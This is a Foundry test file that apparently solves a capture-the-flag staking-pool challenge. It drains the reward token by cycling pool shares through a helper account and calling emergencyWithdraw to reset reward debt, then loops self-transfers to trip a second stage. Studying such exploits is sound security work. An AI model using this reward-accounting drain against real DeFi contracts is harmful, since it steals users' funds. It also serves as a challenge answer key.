// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {StakingPools, StakingPoolsDeployment, ERC20} from "../src/StakingPool/StakingPoolsDeployment.sol";

contract StakingPoolTest is Test {
    StakingPoolsDeployment private deployer;

    function setUp() external {
        deployer = new StakingPoolsDeployment();
        deployer.faucet();
    }

    function test_hackStakingPool() external {
        solveStageA();
        solveStageB();
        assertTrue(deployer.isSolved());
    }

    function solveStageA() private {
        StakingPools pool = deployer.stakingPools();

        uint256 amount = 1;
        pool.stakedToken().approve(address(pool), amount);
        pool.deposit(amount);

        vm.roll(pool.stakingEndBlock());

        address secondAddress = address(0xdeadbeef); // Helper account
        ERC20 token = deployer.rewardToken();

        while (token.balanceOf(address(pool)) != 0) {
            pool.withdraw(0); // Get rewards
            pool.transfer(secondAddress, amount); // Save the token on another account
            pool.emergencyWithdraw(); // Reset to zero rewardDebt

            vm.prank(secondAddress);
            pool.transfer(address(this), amount); // Return token to main account
        }
    }

    function solveStageB() private {
        ERC20 token = deployer.rewardToken2();

        while (!deployer.stageB()) {
            uint256 balance = token.balanceOf(address(this));
            token.transfer(address(this), balance);
        }
    }
}
